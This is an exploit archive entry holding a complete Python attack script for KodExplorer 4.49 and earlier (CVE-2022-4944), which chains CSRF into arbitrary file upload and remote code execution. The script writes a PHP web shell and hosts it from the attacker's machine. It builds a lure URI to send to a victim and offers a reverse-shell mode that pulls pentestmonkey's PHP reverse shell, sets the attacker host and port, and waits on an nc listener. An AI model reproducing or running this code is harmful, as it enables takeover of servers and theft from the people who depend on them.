@@ -1,0 +1,129 @@
+id: 38621
+date: 04/25/2023
+title: KodExplorer 4.49 - CSRF to Arbitrary File Upload Exploit
+author: Mr Empy
+cves: 
+
+# Exploit Title: KodExplorer <= 4.49 - CSRF to Arbitrary File Upload
+# Exploit Author: MrEmpy
+# Software Link: https://github.com/kalcaddle/KodExplorer
+# Version: <= 4.49
+# Tested on: Linux
+# CVE ID: CVE-2022-4944
+# References:
+# * https://vuldb.com/?id.227000
+# * https://www.cve.org/CVERecord?id=CVE-2022-4944
+# * https://github.com/MrEmpy/CVE-2022-4944
+
+import argparse
+import http.server
+import socketserver
+import os
+import threading
+import requests
+from time import sleep
+
+def banner():
+    print('''
+ _   _____________ _____           _                      ______  _____
+ _____
+| | / /  _  |  _  \  ___|         | |                     | ___ \/  __ \|
+ ___|
+| |/ /| | | | | | | |____  ___ __ | | ___  _ __ ___ _ __  | |_/ /| /  \/|
+|__
+|    \| | | | | | |  __\ \/ / '_ \| |/ _ \| '__/ _ \ '__| |    / | |    |
+ __|
+| |\  \ \_/ / |/ /| |___>  <| |_) | | (_) | | |  __/ |    | |\ \ | \__/\|
+|___
+\_| \_/\___/|___/ \____/_/\_\ .__/|_|\___/|_|  \___|_|    \_| \_|
+\____/\____/
+                            | |
+
+                            |_|
+
+                [KODExplorer <= v4.49 Remote Code Executon]
+                           [Coded by MrEmpy]
+
+''')
+
+def httpd():
+    port = 8080
+    httpddir = os.path.join(os.path.dirname(__file__), 'http')
+    os.chdir(httpddir)
+    Handler = http.server.SimpleHTTPRequestHandler
+    httpd = socketserver.TCPServer(('', port), Handler)
+    print('[+] HTTP Server started')
+    httpd.serve_forever()
+
+
+def webshell(url, lhost):
+    payload = '<pre><?php system($_GET["cmd"])?></pre>'
+    path = '/data/User/admin/home/'
+
+    targetpath = input('[*] Target KODExplorer path (ex /var/www/html): ')
+    wshell_f = open('http/shell.php', 'w')
+    wshell_f.write(payload)
+    wshell_f.close()
+    print('[*] Opening HTTPd port')
+    th = threading.Thread(target=httpd)
+    th.start()
+    print(f'[+] Send this URI to your target:
+{url}/index.php?explorer/serverDownload&type=download&savePath={targetpath}/data/User/admin/home/&url=http://
+{lhost}:8080/shell.php&uuid=&time=')
+    print(f'[+] After the victim opens the URI, his shell will be hosted at
+{url}/data/User/admin/home/shell.php?cmd=whoami')
+
+def reverseshell(url, lhost):
+    rvpayload = '
+https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+'
+    path = '/data/User/admin/home/'
+
+    targetpath = input('[*] Target KODExplorer path (ex /var/www/html): ')
+    lport = input('[*] Your local port: ')
+    reqpayload = requests.get(rvpayload).text
+    reqpayload = reqpayload.replace('127.0.0.1', lhost)
+    reqpayload = reqpayload.replace('1234', lport)
+    wshell_f = open('http/shell.php', 'w')
+    wshell_f.write(reqpayload)
+    wshell_f.close()
+    print('[*] Opening HTTPd port')
+    th = threading.Thread(target=httpd)
+    th.start()
+    print(f'[+] Send this URI to your target:
+{url}/index.php?explorer/serverDownload&type=download&savePath={targetpath}/data/User/admin/home/&url=http://
+{lhost}:8080/shell.php&uuid=&time=')
+    input(f'[*] Run the command "nc -lnvp {lport}" to receive the
+connection and press any key\n')
+    while True:
+        hitshell = requests.get(f'{url}/data/User/admin/home/shell.php')
+        sleep(1)
+        if not hitshell.status_code == 200:
+            continue
+        else:
+            print('[+] Shell sent and executed!')
+            break
+
+
+def main(url, lhost, mode):
+    banner()
+    if mode == 'webshell':
+        webshell(url, lhost)
+    elif mode == 'reverse':
+        reverseshell(url, lhost)
+    else:
+        print('[-] There is no such mode. Use webshell or reverse')
+
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u','--url', action='store', help='target url',
+dest='url', required=True)
+    parser.add_argument('-lh','--local-host', action='store', help='local
+host', dest='lhost', required=True)
+    parser.add_argument('-m','--mode', action='store', help='mode
+(webshell, reverse)', dest='mode', required=True)
+    arguments = parser.parse_args()
+    main(arguments.url, arguments.lhost, arguments.mode)
+
+#  0day.today [2023-04-26]  #
